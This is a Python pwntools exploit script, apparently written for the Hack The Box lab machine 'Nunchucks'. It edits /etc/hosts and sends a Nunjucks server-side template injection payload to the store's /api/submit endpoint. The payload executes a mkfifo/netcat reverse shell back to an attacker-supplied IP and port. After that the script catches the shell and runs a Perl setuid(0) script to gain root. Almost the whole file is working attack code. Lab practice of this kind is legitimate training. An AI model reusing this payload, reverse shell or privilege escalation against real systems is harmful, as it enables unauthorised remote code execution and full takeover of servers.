#!/usr/bin/env python3

import sys,time,signal,argparse,requests,warnings,threading,os
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Saliendo...\n")
    clean_hosts()
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

def subdomain_connection(ip):

    p1=log.progress("Test of connection to vulnerable resource")
    p1.status("Starting Test")
    time.sleep(1)

    os.system("cp /etc/hosts /tmp/hosts")

    with open("/etc/hosts","a") as file:
        file.write(f"{ip} store.nunchucks.htb nunchucks.htb")
    
    try:
        request=requests.get("https://store.nunchucks.htb", verify=False)

    except Exception as e:
        print(f"\n[!] The request to host IP failed due to: {e}\n")
        sys.exit(1)

    time.sleep(1)

    p1.success("The connection to the subdomain was successful.")
    time.sleep(1)

def exploit(ip,port):

    headers={"Cookie":"_csrf=AhBhu4Nok34oacNhkLD9b_Tb","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0","Content-Type":"application/json", "Referer":"https://store.nunchucks.htb/", "Origin":"https://store.nunchucks.htb", "Dnt":"1", "Sec-Fetch-Dest":"empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site":"same-origin", "Te":"trailers", "Connection":"close"}
    
    post_data={"email":"{{{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f')\")()}}}}".format(ip,port)}

    with warnings.catch_warnings():
        warnings.simplefilter("ignore")

        request=requests.post("https://store.nunchucks.htb/api/submit",json=post_data,headers=headers,verify=False)

def clean_hosts():

    os.system("cp /tmp/hosts /etc/hosts && rm /tmp/hosts")

if __name__=="__main__":

    argparser=argparse.ArgumentParser(description="Tool to automatically obtain root permisions on the Nunchuks host.", usage="%(prog)s <IP_host> <Your_IP> <Your_Port>")
    argparser.add_argument("host_ip", help="Nunchucks host IP.")
    argparser.add_argument("ip", help="IP where you are going to listen for a reverse shell")
    argparser.add_argument("port", help="Port where you are going to listen for a reverse shell")

    parameters=argparser.parse_args()

    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        
        subdomain_connection(parameters.host_ip)
    
    p2=log.progress("Exploiting Phase")
    p2.status("Starting SSTI exploitation")

    try:
        threading.Thread(target=exploit, args=(parameters.ip,parameters.port,)).start()

    except Exception as e:
        print(f"\n[!] It has been impossible to run the subprocess: {e}\n")
        sys.exit(1)
    
    shell=listen(9999,timeout=20).wait_for_connection()

    p2.success("Successful exploitation")

    shell.sendline(b"echo -n '#!/usr/bin/perl\nuse POSIX qw(setuid);\nPOSIX::setuid(0);\nexec  \"/bin/bash\";'>/tmp/privesc.sh")
    shell.sendline(b"chmod +x /tmp/privesc.sh; /tmp/./privesc.sh")

    shell.interactive()
